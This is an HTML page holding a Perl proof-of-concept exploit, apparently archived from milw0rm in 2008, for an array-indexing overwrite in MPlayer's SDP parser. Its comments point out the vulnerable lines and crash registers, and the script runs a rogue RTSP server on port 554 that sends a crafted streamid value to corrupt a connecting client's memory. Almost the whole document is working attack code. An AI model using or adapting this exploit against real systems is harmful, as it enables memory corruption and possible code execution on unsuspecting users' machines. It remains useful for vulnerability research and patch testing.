<html><head><title>MPlayer sdpplin_parse() Array Indexing Buffer Overflow Exploit PoC</title></head><pre>#!/usr/bin/perl

# Huston, mplayer got some vulns!  :( 
# CVE-2008-0073 also apply to mplayer and vlc with some distinctions.
#
# Assuming kernel.va_randomize=0 this overwrite EIP with a &quot;stream&quot; structure on my box.
#
# The first element of the &quot;stream&quot; structure is a user-supplied buffer so it is not really useful to overwrite 
# EIP, let's find the right target: we can overwrite every memory location beyond the desc-&gt;stream pointer and 
# some before it.
#
# Vulnerable code:
# sdpplin_parse_stream()
#  desc-&gt;stream_id=atoi(buf); 
# spplin_parse()
#  desc-&gt;stream[stream-&gt;stream_id]=stream; 
#
# Test:
# - mplayer rtsp://evilhost/evil.rm 
# eax    0xa0737008  // pointer to desc-&gt;stream 
# edx    0x0495badd  // &quot;streamid&quot; value
# edi    0x089b59e8  // pointer to stream 
#
# &lt;sdpplin_parse+731&gt;: mov    DWORD PTR [eax+edx*4],edi 

use warnings;
use strict;
use IO::Socket;

my $evil_num	=  &quot;127467297&quot;; # this is a 4byte offset from desc-&gt;stream
		 

my $rtp_hello = &quot;RTSP/1.0 200 OK\r\n&quot;.
		&quot;CSeq: 1\r\n&quot;.
		&quot;Date: Thu, 20 Mar 2008 20:07:39 GMT\r\n&quot;.
		&quot;Server: RealServer Version 9.0.2.794 (sunos-5.8-sparc-server)\r\n&quot;.
		&quot;Public: OPTIONS, DESCRIBE, ANNOUNCE, PLAY, SETUP, GET_PARAMETER, SET_PARAMETER, TEARDOWN\r\n&quot;.
		&quot;RealChallenge1: de6654ba4935b8b9d8af3ba8d6f8e71c\r\n&quot;.
		&quot;StatsMask: 3\r\n\r\n&quot;;

my $rtp_evil =	&quot;RTSP/1.0 200 OK\r\n&quot;.
		&quot;CSeq: 2\r\n&quot;.
		&quot;Date: Thu, 20 Mar 2008 20:08:34 GMT\r\n&quot;.
		&quot;vsrc: http://0.00.00.00:31337\r\n&quot;.
		&quot;Content-base: rtsp://0.00.00.00:554/bu.rm\r\n&quot;.
		&quot;ETag: 55370-2\r\n&quot;.
		&quot;Session: 93033-2\r\n&quot;.
		&quot;Content-type: application/sdp\r\n&quot;.
		&quot;Content-length: 677\r\n\r\n&quot;.

		&quot;v=0\r\n&quot;.
		&quot;o=-1028652722 1028652722 IN IP4 0.00.00.00\r\n&quot;.
		&quot;s=realmp3\r\n&quot;.
		&quot;i=&lt;No author&gt; &lt;No copyright&gt;\r\n&quot;.
		&quot;c=IN IP4 0.0.0.0\r\n&quot;.
		&quot;t=0 0\r\n&quot;.
		&quot;a=SdpplinVersion:1610645242\r\n&quot;.
		&quot;a=StreamCount:integer;\&quot;1166000000\&quot;\r\n&quot;.
		&quot;a=Title:buffer;\&quot;dtFabH2rNoP=\&quot;\r\n&quot;.
		&quot;a=range:npt=0-39.471000\r\n&quot;.
		&quot;m=audio 0 RTP/AVP 101\r\n&quot;. 	# this is referenced by &quot;stream&quot; 
		&quot;b=AS:128\r\n&quot;.
		&quot;a=control:streamid=$evil_num\r\n&quot;.
		&quot;a=range:npt=0-39.471000\r\n&quot;.
		&quot;a=length:npt=39.471000\r\n&quot;.
		&quot;a=rtpmap:101 X-MP3-draft-00/1000\r\n&quot;.
		&quot;a=mimetype:string;\&quot;audio/X-MP3-draft-00\&quot;\r\n&quot;.
		&quot;a=StartTime:integer;0\r\n&quot;.
		&quot;a=AvgBitRate:integer;128000\r\n&quot;.
		&quot;a=SampleRate:integer;44100\r\n&quot;.
		&quot;a=AvgPacketSize:integer;417\r\n&quot;.
		&quot;a=Preroll:integer;1000\r\n&quot;.
		&quot;a=NumChannels:integer;2\r\n&quot;.
		&quot;a=MaxPacketSize:integer;1024\r\n&quot;.
		&quot;a=ASMRuleBook:string;\&quot;AverageBandwidth=128000, AverageBandwidthStd=0, Priority=9;\&quot;\r\n&quot;;


	
my @resps = (	$rtp_hello,	
		$rtp_evil,
	
		&quot;RTSP/1.0 200 OK\r\n&quot;.
		&quot;CSeq: 3\r\n&quot;.
		&quot;Date: Sat, 22 Mar 2008 20:45:47 GMT\r\n&quot;.
		&quot;Session: 93033-2\n\r&quot;.
		&quot;Reconnect: true\n\r&quot;.
		&quot;RealChallenge3: 2520b5cd0e5e5622ec25f563312aba3e4f213d09,sdr=2b05ef3b\n\r&quot;.
		&quot;RDTFeatureLevel: 2\r\n&quot;.
		&quot;Transport: x-pn-tng/tcp;interleaved=0\r\n\r\n&quot;,

		&quot;RTSP/1.0 200 OK\r\n&quot;.
		&quot;CSeq: 4\r\n&quot;.
		&quot;Date: Sat, 22 Mar 2008 15:11:06 GMT\r\n&quot;.
		&quot;Session: 93033-2\r\n\r\n&quot;,

		&quot;RTSP/1.0 200 OK\r\n&quot;.
		&quot;CSeq: 5\r\n&quot;.
		&quot;Date: Sat, 22 Mar 2008 15:11:06 GMT&quot;.
		&quot;RTP-Info: url=rtsp://0.00.00.00/bu.rm\r\n\r\n&quot;,
		);


my $sock = IO::Socket::INET-&gt;new(LocalAddr =&gt; '0.0.0.0', LocalPort =&gt; '554', Listen =&gt; 1, Reuse =&gt; 1);

while(my $csock = $sock-&gt;accept)
{
	foreach my $resp(@resps)
	{
		my $buf = read_from_sock($csock);
		print $csock $resp;
	}
}


sub read_from_sock()
{
	my ($sock) = @_;

	my $buffer = &quot;&quot;;

	while(&lt;$sock&gt;)
	{
		return $buffer if /^\r\n$/;
		$buffer .= $_;
	}

	return $buffer;

}

# milw0rm.com [2008-03-25]</pre></html>